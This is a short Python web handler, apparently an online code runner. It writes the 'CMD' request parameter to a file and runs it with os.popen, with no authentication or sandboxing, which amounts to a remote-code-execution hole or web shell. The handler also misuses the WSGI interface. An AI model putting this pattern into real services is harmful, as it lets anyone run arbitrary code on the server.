# -*- coding:utf-8
import os

def application(params, start_response):
	
	status = "200 OK"
	headers = [("Content-Type", "text/plain")]
	start_response(status, headers)

	if "CMD" in params and params["CMD"].strip():
		with open("tmp.py", 'w') as writer:
			writer.write(params["CMD"])
		data = os.popen("python tmp.py 2>err.log", 'r').read()
		if not data:
			data = open("err.log", 'r', encoding="utf-8").read()
		result = ""
		for line in data.split('\n'):
			result += "<p>{}</p>".format(line)
		return result
	else:
		return "Bad Parameters!"